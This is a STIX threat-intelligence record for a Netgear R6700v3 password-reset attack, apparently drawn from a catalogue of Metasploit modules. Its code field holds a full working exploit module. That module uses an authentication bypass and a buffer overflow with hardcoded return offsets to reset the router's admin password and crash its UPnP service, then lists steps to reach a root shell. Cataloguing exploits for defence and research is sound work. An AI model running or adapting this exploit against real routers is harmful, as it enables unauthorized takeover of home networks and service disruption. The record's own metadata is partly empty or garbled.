{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77f25563-907b-463e-b861-198b4bbec2b4",
    "created": "2024-08-14T16:24:01.299318Z",
    "modified": "2024-08-14T16:24:01.299322Z",
    "name": "Netgear R6700v3 Unauthenticated LAN Admin Password Reset",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netgear_r6700_pass_reset.rb",
            "external_id": "netgear_r6700_pass_reset.rb"
        },
        {
            "source_name": "usingZDI-20-703(akaCVE-2020-10923)",
            "external_id": "anauthenticationbypassthatoccurswhennetworkadjacent"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md"
        },
        {
            "source_name": "reference",
            "url": "https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10923"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10924"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netgear R6700v3 Unauthenticated LAN Admin Password Reset',\n        'Description' => %q{\n          This module targets ZDI-20-704 (aka CVE-2020-10924), a buffer overflow vulnerability in the UPNP daemon (/usr/sbin/upnpd),\n          on Netgear R6700v3 routers running firmware versions from V1.0.2.62 up to but not including V1.0.4.94, to reset\n          the password for the 'admin' user back to its factory default of 'password'. Authentication is bypassed by\n          using ZDI-20-703 (aka CVE-2020-10923), an authentication bypass that occurs when network adjacent\n          computers send SOAPAction UPnP messages to a vulnerable Netgear R6700v3 router. Currently this module only\n          supports exploiting Netgear R6700v3 routers running either the V1.0.0.4.82_10.0.57 or V1.0.0.4.84_10.0.58\n          firmware, however support for other firmware versions may be added in the future.\n\n          Once the password has been reset, attackers can use the exploit/linux/telnet/netgear_telnetenable module to send a\n          special packet to port 23/udp of the router to enable a telnet server on port 23/tcp. The attacker can\n          then log into this telnet server using the new password, and obtain a shell as the \"root\" user.\n\n          These last two steps have to be done manually, as the authors did not reverse the communication with the web interface.\n          It should be noted that successful exploitation will result in the upnpd binary crashing on the target router.\n          As the upnpd binary will not restart until the router is rebooted, this means that attackers can only exploit\n          this vulnerability once per reboot of the router.\n\n          This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +\n          Radek Domanski).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Twitter: @pedrib1337. Vulnerability discovery and Metasploit module\n          'Radek Domanski <radek.domanski[at]gmail.com>', # Twitter: @RabbitPro. Vulnerability discovery and Metasploit module\n          'gwillcox-r7' # Minor general updates plus updated implementation of the check method to identify a wider range of vulnerable targets.\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md'],\n          [ 'URL', 'https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders'],\n          [ 'CVE', '2020-10923'],\n          [ 'CVE', '2020-10924'],\n          [ 'ZDI', '20-703'],\n          [ 'ZDI', '20-704']\n        ],\n        # Note that reliability isn't included here, as technically the exploit can only\n        # only be run once, after which the service crashes.\n        'Notes' => {\n          'SideEffects' => [ CONFIG_CHANGES ], # This module will change the configuration by\n          # resetting the router to the default factory password.\n          'Stability' => [ CRASH_SERVICE_DOWN ], # This module will crash the target service after it is run.\n          'Reliability' => [],\n          'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.\n        },\n        'DisclosureDate' => '2020-06-15',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(5000)\n      ]\n    )\n  end\n\n  def retrieve_version\n    soap =\n      '<?xml version=\"1.0\"?>'\\\n      \"\\r\\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" SOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\"\\\n      \"\\r\\n<SOAP-ENV:Body>\"\\\n      \"\\r\\nSetDeviceNameIconByMAC\"\\\n      \"\\r\\n<NewBlockSiteName>1\"\\\n      \"\\r\\n</NewBlockSiteName>\"\\\n      \"\\r\\n</SOAP-ENV:Body>\"\\\n      \"\\r\\n</SOAP-ENV:Envelope>\"\n\n    # the GetInfo method will helpfully report the firmware version to an unauth request\n    headers = 'SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo'\n\n    res = send_request_cgi({\n      'uri' => '/soap/server_sa',\n      'method' => 'POST',\n      'raw_headers' => headers,\n      'data' => soap\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, \"Failed to obtain device version: Target didn't respond\")\n    elsif (res.body.to_s == '') || (res.code != 200)\n      fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: Unexpected response code')\n    end\n\n    version = res.body.to_s.scan(/V(\\d\\.\\d\\.\\d\\.\\d{1,2})/).flatten.first # Try find a version number in the format V1.2.3.48 or similar.\n    if version.nil? # Check we actually got a result.\n      fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: no version number found in response') # Taken from https://stackoverflow.com/questions/4115115/extract-a-substring-from-a-string-in-ruby-using-a-regular-expression\n    end\n    Rex::Version.new(version) # Finally lets turn it into a Rex::Version object for later use in other parts of the code.\n  end\n\n  def check\n    target_version = retrieve_version\n    print_status(\"Target is running firmware version #{target_version}\")\n    if (target_version < Rex::Version.new('1.0.4.94')) && (target_version >= Rex::Version.new('1.0.2.62'))\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def find_offset\n    target_version = retrieve_version\n    if target_version == Rex::Version.new('1.0.4.84')\n      print_status(\"#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.\")\n      # this offset is where execution will jump to\n      # a part in the middle of the binary that resets the admin password\n      return \"\\x58\\x9a\\x03\"\n    elsif target_version == Rex::Version.new('1.0.4.82')\n      print_status(\"#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.\")\n      return \"\\x48\\x9a\\x03\"\n    end\n  end\n\n  def run\n    offset = find_offset\n    if !offset\n      fail_with(Failure::NoTarget, 'Identified firmware version is not supported. Please contact the authors.')\n    end\n\n    headers =\n      \"SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\\nSOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#Whatever\"\n\n    payload =\n      '<?xml version=\"1.0\"?>'\\\n      \"\\r\\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" SOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\"\\\n      \"\\r\\n<SOAP-ENV:Body>\"\\\n      \"\\r\\nSetDeviceNameIconByMAC\"\\\n      \"\\r\\n<NewBlockSiteName>1\"\n\n    # filler\n    payload += Rex::Text.rand_text_alpha(1028)\n    # $r4\n    payload += Rex::Text.rand_text_alpha(4)\n    # $r5\n    payload += Rex::Text.rand_text_alpha(4)\n    # $r6\n    payload += Rex::Text.rand_text_alpha(4)\n    # $r7\n    payload += Rex::Text.rand_text_alpha(4)\n    # $r8\n    payload += Rex::Text.rand_text_alpha(4)\n    # $lr (AKA return address)\n    payload += offset\n\n    # trailer\n    payload +=\n      \"\\r\\n</NewBlockSiteName>\"\\\n      \"\\r\\n</SOAP-ENV:Body>\"\\\n      \"\\r\\n</SOAP-ENV:Envelope>\"\n\n    headers.gsub! \"\\n\", \"\\r\\n\"\n    payload.gsub! \"\\n\", \"\\r\\n\"\n\n    # MSF adds content len automatically.\n    # Unfortunately this appears before the raw headers hash, but doesn't appear to have ill effects\n    headers += \"\\r\\n\"\n\n    res = send_request_cgi({\n      'uri' => '/soap/server_sa',\n      'method' => 'POST',\n      'raw_headers' => headers,\n      'data' => payload\n    })\n\n    if res\n      # no response is received in case of success\n      fail_with(Failure::UnexpectedReply, 'Failed to send HTTP payload... try again?')\n    else\n      print_good(\"#{peer} - HTTP payload sent! 'admin' password has been reset to 'password'\")\n      print_status('To achieve code execution, do the following steps manually:')\n      print_status(\"1- Login to #{rhost} with creds 'admin:password', then:\")\n      print_status(\"\\t1.1- go to Advanced -> Administration -> Set Password\")\n      print_status(\"\\t1.2- Change the password from 'password' to <WHATEVER>\")\n      print_status('2- Run metasploit as root, then:')\n      print_status(\"\\t2.1- use exploit/linux/telnet/netgear_telnetenable\")\n      print_status(\"\\t2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>\")\n      print_status(\"\\t2.3- set rhost #{rhost}\")\n      print_status(\"\\t2.3- set username admin\")\n      print_status(\"\\t2.4- set password <WHATEVER>\")\n      print_status(\"\\t2.5- OPTIONAL: set timeout 1500\")\n      print_status(\"\\t2.6- OPTIONAL: set MAC <ROUTERS_MAC>\")\n      print_status(\"\\t2.7- run it and login with 'admin:<WHATEVER>'\")\n      print_status('3- Enjoy your root shell!')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-06-15"
}